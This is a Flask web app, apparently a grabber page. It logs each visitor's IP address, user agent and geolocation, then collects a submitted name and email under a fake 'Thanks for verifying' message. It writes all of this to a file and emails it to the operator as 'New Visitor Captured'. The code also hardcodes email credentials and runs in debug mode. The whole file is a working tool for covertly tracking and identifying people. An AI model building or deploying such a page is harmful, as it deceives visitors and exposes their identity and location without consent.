from flask import Flask, request, render_template
from datetime import datetime
import requests
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

GEOIP_API = "https://ipapi.co/{}/json/"

EMAIL_SENDER = "youremail@example.com"
EMAIL_PASSWORD = "yourpassword"
EMAIL_RECEIVER = "youremail@example.com"

def send_email(subject, body):
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg['Subject'] = subject
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
            smtp.send_message(msg)
    except Exception as e:
        print("Failed to send email:", e)

def get_geo_info(ip):
    try:
        response = requests.get(GEOIP_API.format(ip))
        return response.json()
    except:
        return {}

@app.route("/", methods=["GET", "POST"])
def index():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    geo = get_geo_info(ip)
    location = f"{geo.get('city', 'N/A')}, {geo.get('country_name', 'N/A')}"

    if request.method == "POST":
        name = request.form.get("name")
        email = request.form.get("email")
        log_entry = f"Time: {now}\nIP: {ip}\nLocation: {location}\nUser-Agent: {user_agent}\nName: {name}\nEmail: {email}\n\n"

        with open("log.txt", "a") as f:
            f.write(log_entry)

        send_email("New Visitor Captured", log_entry)
        return "<h3>Thanks for verifying. This page will close automatically.</h3><script>setTimeout(()=>{window.close();}, 2000);</script>"

    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)
